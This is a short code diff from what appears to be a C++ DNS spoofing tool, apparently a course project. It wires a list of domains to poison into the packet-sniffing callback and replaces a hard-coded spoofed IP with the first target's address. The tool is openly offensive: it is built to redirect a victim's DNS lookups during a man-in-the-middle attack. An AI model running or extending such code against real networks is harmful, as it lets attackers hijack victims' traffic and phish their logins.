@@ -121,6 +121,7 @@ int main(int argc, const char *argv[]) {
     dnsSniffArgs.net = &ipEngine;
     dnsSniffArgs.victimIp = &victimIp;
     dnsSniffArgs.gatewayIP = &gatewayIp;
+	dnsSniffArgs.targets = convertToVector(domainsToPoison);
     std::thread dnsThread(dnsSpoof, &dnsSniffArgs);
 
     std::cout << "dns sniffing started" << std::endl;
@@ -193,12 +194,13 @@ void dnsSpoof(struct DnsSniffArgs *args) {
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet) {
     struct DnsSniffArgs *params = (struct DnsSniffArgs *)args;
-
+	
+	std::vector<struct DomainIpPair> pairs = params->targets;
     // this is the domain ip pair struct
     struct DomainIpPair pair;
 
-    // TODO: hard coded values for testing, remove
-    pair.ip.s_addr = 0x1300a8c0;
+	// Copy IP from first element of vector 
+	memcpy(&pair.ip, &pairs[0].ip, sizeof(struct in_addr));
     unsigned char addressFilter[] = {0x09, 'm', 'i', 'l', 'l', 'i',  'w', 'a', 'y', 's', 0x04, 'b', 'c', 'i', 't', 0x02, 'c', 'a', 0x00};
     memcpy(pair.name, addressFilter, sizeof(addressFilter));
 
